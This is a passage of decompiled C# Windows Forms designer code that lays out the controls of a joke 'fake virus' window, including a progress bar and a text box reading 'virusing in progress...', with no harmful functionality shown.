		((Control)dataGridView1).set_Size(new Size(240, 150));
		((Control)dataGridView1).set_TabIndex(2);
		((DataGridViewColumn)Column1).set_HeaderText("Column1");
		((DataGridViewColumn)Column1).set_Name("Column1");
		((DataGridViewColumn)Column2).set_HeaderText("Column2");
		((DataGridViewColumn)Column2).set_Name("Column2");
		((DataGridViewColumn)Column3).set_HeaderText("Column3");
		((DataGridViewColumn)Column3).set_Name("Column3");
		((DataGridViewColumn)Column4).set_HeaderText("Column4");
		((DataGridViewColumn)Column4).set_Name("Column4");
		((DataGridViewColumn)Column5).set_HeaderText("Column5");
		((DataGridViewColumn)Column5).set_Name("Column5");
		((DataGridViewColumn)Column6).set_HeaderText("Column6");
		((DataGridViewColumn)Column6).set_Name("Column6");
		((Control)dateTimePicker1).set_Location(new Point(481, 350));
		((Control)dateTimePicker1).set_Name("dateTimePicker1");
		((Control)dateTimePicker1).set_Size(new Size(200, 20));
		((Control)dateTimePicker1).set_TabIndex(3);
		((Control)groupBox1).get_Controls().Add((Control)(object)listBox1);
		((Control)groupBox1).set_Location(new Point(49, 288));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(200, 100));
		((Control)groupBox1).set_TabIndex(4);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("groupBox1");
		((ListControl)listBox1).set_FormattingEnabled(true);
		((Control)listBox1).set_Location(new Point(-199, -29));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(120, 95));
		((Control)listBox1).set_TabIndex(0);
		((Control)pictureBox1).set_Location(new Point(274, 89));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(100, 50));
		pictureBox1.set_TabIndex(5);
		pictureBox1.set_TabStop(false);
		((Control)richTextBox1).set_Location(new Point(292, 274));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(116, 96));
		((Control)richTextBox1).set_TabIndex(6);
		((Control)richTextBox1).set_Text("virusing in progress...");
		((Control)progressBar1).set_Location(new Point(192, 39));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(381, 23));
		((Control)progressBar1).set_TabIndex(7);
		progressBar1.set_Value(65);
		((Control)trackBar1).set_Location(new Point(252, 200));
		((Control)trackBar1).set_Name("trackBar1");
		((Control)trackBar1).set_Size(new Size(104, 45));
		((Control)trackBar1).set_TabIndex(8);
		((Control)vScrollBar1).set_Location(new Point(752, 132));
		((Control)vScrollBar1).set_Name("vScrollBar1");
		((Control)vScrollBar1).set_Size(new Size(17, 163));
		((Control)vScrollBar1).set_TabIndex(9);
		((Control)button1).set_Location(new Point(466, 288));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)vScrollBar1);
		((Control)this).get_Controls().Add((Control)(object)trackBar1);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)dateTimePicker1);
		((Control)this).get_Controls().Add((Control)(object)dataGridView1);
		((Control)this).get_Controls().Add((Control)(object)domainUpDown1);
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("deatg fake virus");
		((ISupportInitialize)dataGridView1).EndInit();
		((Control)groupBox1).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)trackBar1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
